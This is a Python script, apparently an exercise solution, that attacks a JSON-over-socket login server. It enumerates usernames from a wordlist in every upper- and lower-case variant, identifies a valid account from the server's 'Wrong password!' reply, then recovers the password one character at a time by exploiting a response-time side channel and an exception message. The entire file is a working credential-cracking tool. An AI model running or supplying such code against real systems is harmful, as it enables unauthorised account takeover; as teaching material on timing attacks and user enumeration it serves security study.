# write your code here
import sys
import socket
import string
import json
from itertools import product
from datetime import datetime

CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase

NEXT_CONTINUE = 0
NEXT_STOP = 1


class Gate:
    RES_SUCCESS = 0
    RES_WRONG_LOGIN = 1
    RES_WRONG_PWD = 2
    RES_LOGIN_EXCEPTION = 3
    RES_UNKNOWN = 4

    def __init__(self, sock):
        self.client = sock

    def login(self, login, pwd):
        req = {
            "login": login,
            "password": pwd
        }
        resp, took = self.json_request(req)
        res = resp.get("result")

        if res is None:
            return Gate.RES_UNKNOWN, took
        if res == "Wrong login!":
            return Gate.RES_WRONG_LOGIN, took
        if res == "Wrong password!":
            return Gate.RES_WRONG_PWD, took
        if res == "Exception happened during login":
            return Gate.RES_LOGIN_EXCEPTION, took
        if res == "Connection success!":
            return Gate.RES_SUCCESS, took
        return Gate.RES_UNKNOWN, took

    def json_request(self, req):
        req_bs = json.dumps(req).encode()
        start = datetime.now()
        self.client.send(req_bs)
        resp_bs = self.client.recv(1024)
        stop = datetime.now()

        took = stop - start
        return json.loads(resp_bs.decode()), took


def run(ip, port):
    pwd = None

    with socket.socket() as client:
        client.connect((ip, port))
        gate = Gate(client)

        logins = typical_logins()
        login = check_logins(logins, gate)
        if login is not None:
            pwd = guess_pwd(login, gate)

    if login is not None and pwd is not None:
        res = {"login": login, "password": pwd}
        print(json.dumps(res))
    else:
        print("Login", login, "pwd", pwd)


def brute_pwds():
    n = 1
    while True:
        pwds = gen_of_len(n)
        for p in pwds:
            yield ''.join(p)
        n += 1


def gen_of_len(n):
    return product(CHARS, repeat=n)


def typical_logins():
    yield from case_shuffled(lines_from("logins.txt"))


def case_shuffled(words):
    for w in words:
        yield from shuffle_cases(w)


def shuffle_cases(w):
    cur = w.lower()
    while cur is not None:
        yield cur
        cur = next_case_shuffle(cur)


def next_case_shuffle(w):
    if len(w) == 0:
        return None
    prefix = w[:-1]
    last = w[-1]
    if last.isalpha():
        if last.islower():
            next_prefix = prefix
            next_last = last.upper()
        else:
            next_prefix = next_case_shuffle(prefix)
            next_last = last.lower()
    else:
        next_prefix = next_case_shuffle(prefix)
        next_last = last

    if next_prefix is None:
        return None
    return next_prefix + next_last


def lines_from(file):
    with open(file, "r") as f:
        for line in f:
            yield line.strip()


def check_logins(logins, gate):
    for login in logins:
        res, took = gate.login(login, ' ')
        if res == Gate.RES_WRONG_PWD:
            return login
    return None


def guess_pwd(login, gate):
    pwd = ''
    while len(pwd) < 20:
        for p in gen_next_char(pwd):
            res, took = gate.login(login, p)
            if res == Gate.RES_SUCCESS:
                return p
            if res == Gate.RES_WRONG_PWD and took.microseconds > 1000:
                pwd = p
                break
            if res == Gate.RES_LOGIN_EXCEPTION:
                pwd = p
                break


def gen_next_char(prefix):
    for c in CHARS:
        yield prefix + c


def main():
    args = sys.argv
    ip = args[1]
    port = int(args[2])

    run(ip, port)


main()
